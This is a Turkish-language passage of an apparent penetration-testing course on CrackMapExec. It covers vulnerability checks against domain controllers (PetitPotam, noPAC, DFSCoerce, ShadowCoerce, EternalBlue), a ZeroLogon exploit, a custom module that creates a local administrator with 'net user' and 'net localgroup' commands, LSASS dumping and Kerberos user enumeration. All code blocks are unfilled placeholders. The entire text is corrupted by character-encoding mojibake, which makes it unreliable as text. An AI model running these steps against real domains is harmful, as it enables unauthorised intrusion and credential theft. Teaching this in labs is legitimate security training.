CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

